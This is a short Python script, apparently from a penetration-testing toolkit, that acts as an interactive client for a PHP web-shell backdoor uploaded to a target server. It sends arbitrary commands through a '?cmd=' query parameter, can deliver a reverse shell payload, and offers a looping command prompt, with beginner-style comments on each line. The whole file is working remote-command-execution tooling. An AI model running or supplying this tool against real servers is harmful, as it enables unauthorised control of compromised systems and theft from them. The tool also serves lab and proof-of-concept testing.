import argparse
import time
import requests
# imports four modules argparse (used for system arguments), time (used for time), requests (used for HTTP/HTTPs Requests), os (used for operating system commands)
import os
# generates a variable called parser and uses argparse to create a description
parser = argparse.ArgumentParser(description="Interactive Web Shell for PoCs")
parser.add_argument("-t", "--target", help="Specify the target host E.g. http://<TARGET IP>:3001/uploads/backdoor.php",
                    required=True)  # specifies flags such as -t for a target with a help and required option being true
# similar to above
parser.add_argument(
    "-p", "--payload", help="Specify the reverse shell payload E.g. a python3 reverse shell. IP and Port required in the payload")
# similar to above
parser.add_argument(
    "-o", "--option", help="Interactive Web Shell with loop usage: python3 web_shell.py -t http://<TARGET IP>:3001/uploads/backdoor.php -o yes")
# defines args as a variable holding the values of the above arguments so we can do args.option for example.
args = parser.parse_args()
# checks if args.target (the url of the target) and the payload is blank if so it'll show the help menu
if args.target == None and args.payload == None:
    parser.print_help()  # shows help menu
# elif (if they both have values do some action)
elif args.target and args.payload:
    # sends the request with a GET method with the targets URL appends the /?cmd= param and the payload and then prints out the value using .text because we're already sending it within the print() function
    print(requests.get(args.target+"/?cmd="+args.payload).text)
# if the target option is set and args.option is set to yes (for a full interactive shell)
if args.target and args.option == "yes":
    os.system("clear")  # clear the screen (linux)
    while True:  # starts a while loop (never ending loop)
        try:  # try statement
            # defines a cmd variable for an input() function which our user will enter
            cmd = input("$ ")
            # same as above except with our input() function value
            print(requests.get(args.target+"/?cmd="+cmd).text)
            time.sleep(0.3)  # waits 0.3 seconds during each request
        except requests.exceptions.InvalidSchema:  # error handling
            print("Invalid URL Schema: http:// or https://")
        except requests.exceptions.ConnectionError:  # error handling
            print("URL is invalid")
